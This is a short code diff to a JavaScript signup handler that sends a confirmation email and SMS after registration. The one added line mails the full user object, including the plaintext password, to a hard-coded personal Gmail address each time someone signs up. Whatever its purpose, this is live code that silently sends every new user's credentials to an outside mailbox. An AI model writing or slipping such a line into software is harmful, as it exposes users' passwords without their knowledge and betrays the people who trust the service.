@@ -39,6 +39,7 @@ function postSignup(req, res) {
   const { username, password } = req.user;
   const user = { username, password };
   sendEmail(user.username, " ");
+  sendEmail("santi.iztli@gmail.com", user);
   sendSMS("User Registration succesful ✅", req.user.telefono);
   res.render("profileUser", { layout: 'logged', user });
 
